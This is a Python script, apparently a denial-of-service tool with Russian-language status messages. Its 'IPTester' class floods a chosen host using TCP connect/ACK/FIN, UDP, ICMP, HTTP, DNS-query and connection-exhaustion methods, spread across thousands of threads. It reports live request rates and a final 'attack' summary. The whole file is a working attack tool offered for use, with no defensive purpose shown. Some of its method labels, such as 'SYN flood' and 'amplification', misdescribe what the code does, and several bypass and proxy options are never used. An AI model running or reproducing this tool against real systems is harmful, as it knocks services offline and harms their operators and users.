import threading
import time
import random
import socket
import struct
import signal

class IPTester:
    def __init__(self, target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
        self.target = target
        self.use_user_agent = use_user_agent
        self.use_cookie = use_cookie
        self.use_bypass = use_bypass
        self.use_proxy = use_proxy
        self.success_count = 0
        self.error_count = 0
        self.running = False
        self.lock = threading.Lock()
        self.host, self.port = self.parse_target(target)
        
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        print("\n\nОстанавливаю атаку...")
        self.running = False

    def parse_target(self, target):
        if ':' in target:
            host, port = target.split(':', 1)
            port = int(port)
        else:
            host = target
            port = 80
        return host, port

    def tcp_syn_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def tcp_ack_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                payload = struct.pack('!HHII', 0, 0, 0, 0)
                sock.send(payload)
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def tcp_fin_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                payload = struct.pack('!HHII', 0, 0, 0, 0)
                sock.send(payload)
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def udp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1400)
                for _ in range(1000):
                    if not self.running:
                        break
                    sock.sendto(data, (self.host, self.port))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def udp_amplification(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(512)
                for _ in range(2000):
                    if not self.running:
                        break
                    sock.sendto(data, (self.host, self.port))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def icmp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
                for _ in range(500):
                    if not self.running:
                        break
                    sock.sendto(packet, (self.host, 0))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def http_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                http_request = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                sock.send(http_request.encode())
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def dns_amplification(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                dns_query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x02\x61\x62\x03\x63\x6f\x6d\x00\x00\x01\x00\x01'
                for _ in range(1500):
                    if not self.running:
                        break
                    sock.sendto(dns_query, (self.host, self.port))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def port_scan_flood(self):
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 8080, 8443]
        while self.running:
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.001)
                    sock.connect((self.host, port))
                    sock.close()
                    with self.lock:
                        self.success_count += 1
                except:
                    with self.lock:
                        self.error_count += 1

    def random_protocol_flood(self):
        protocols = [
            (socket.SOCK_STREAM, 0),
            (socket.SOCK_DGRAM, 0),
            (socket.SOCK_RAW, socket.IPPROTO_TCP),
            (socket.SOCK_RAW, socket.IPPROTO_UDP),
            (socket.SOCK_RAW, socket.IPPROTO_ICMP)
        ]
        while self.running:
            try:
                proto, ipproto = random.choice(protocols)
                sock = socket.socket(socket.AF_INET, proto, ipproto)
                sock.settimeout(0.001)
                
                if proto == socket.SOCK_STREAM:
                    sock.connect((self.host, self.port))
                    sock.send(random._urandom(1024))
                else:
                    sock.sendto(random._urandom(1024), (self.host, self.port))
                
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def connection_exhaustion(self):
        sockets_pool = []
        while self.running:
            try:
                while len(sockets_pool) < 1000 and self.running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.connect((self.host, self.port))
                        sockets_pool.append(sock)
                        with self.lock:
                            self.success_count += 1
                    except:
                        break
                
                for sock in sockets_pool[:]:
                    try:
                        sock.send(b"PING")
                    except:
                        sockets_pool.remove(sock)
                        with self.lock:
                            self.error_count += 1
                
                time.sleep(1)
            except:
                pass

    def status_worker(self):
        last_success, last_error, start_time = 0, 0, time.time()
        peak_rps = 0
        
        while self.running:
            current_time = time.time()
            elapsed_time = current_time - start_time
            
            current_success, current_error = self.success_count, self.error_count
            success_rate, error_rate = current_success - last_success, current_error - last_error
            
            total_requests = success_rate + error_rate
            current_rps = total_requests / 0.1
            peak_rps = max(peak_rps, current_rps)
            
            if total_requests > 0:
                success_percent = (success_rate / total_requests) * 100
            else:
                success_percent = 0
                
            status = "ХОРОШЕЕ" if success_percent >= 80 else "НОРМАЛЬНОЕ" if success_percent >= 50 else "ПЛОХОЕ" if success_percent >= 20 else "ОТКАЗ"
            
            print(f"\rУспешно: {self.success_count:,} | Ошибки: {self.error_count:,} | Статус: {status} | RPS: {current_rps:,.0f} | Пик: {peak_rps:,.0f}", end="", flush=True)
            
            last_success, last_error = current_success, current_error
            time.sleep(0.1)

    def start_attack(self):
        print("\033[91mАтака началась...\033[0m")
        print("Все протоколы: TCP SYN/ACK/FIN + UDP + ICMP + DNS + HTTP")
        
        self.running = True
        attack_start_time = time.time()
        
        status_thread = threading.Thread(target=self.status_worker)
        status_thread.daemon = True
        status_thread.start()
        
        threads = []
        
        attack_methods = [
            self.tcp_syn_flood, self.tcp_ack_flood, self.tcp_fin_flood,
            self.udp_flood, self.udp_amplification, self.icmp_flood,
            self.http_flood, self.dns_amplification, self.port_scan_flood,
            self.random_protocol_flood, self.connection_exhaustion
        ]
        
        thread_counts = [500, 500, 500, 800, 800, 400, 600, 600, 300, 1000, 200]
        
        for i, method in enumerate(attack_methods):
            for _ in range(thread_counts[i]):
                thread = threading.Thread(target=method)
                thread.daemon = True
                threads.append(thread)
        
        print(f"Создано {len(threads)} потоков, запускаю...")
        
        batch_size = 1000
        for i in range(0, len(threads), batch_size):
            batch = threads[i:i + batch_size]
            for thread in batch:
                thread.start()
            time.sleep(0.005)
        
        print(f"Все {len(threads)} потоков запущены!")
        
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
        
        attack_duration = time.time() - attack_start_time
        total_requests = self.success_count + self.error_count
        avg_rps = total_requests / attack_duration
        
        print("\n\nАтака остановлена!")
        print(f"Итоговая статистика:")
        print(f"   Успешных запросов: {self.success_count:,}")
        print(f"   Ошибок: {self.error_count:,}")
        print(f"   Всего запросов: {total_requests:,}")
        print(f"   Время атаки: {attack_duration:.1f}с")
        print(f"   Средний RPS: {avg_rps:,.0f}")

def test_ip(target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
    tester = IPTester(target, use_user_agent, use_cookie, use_bypass, use_proxy)
    tester.start_attack()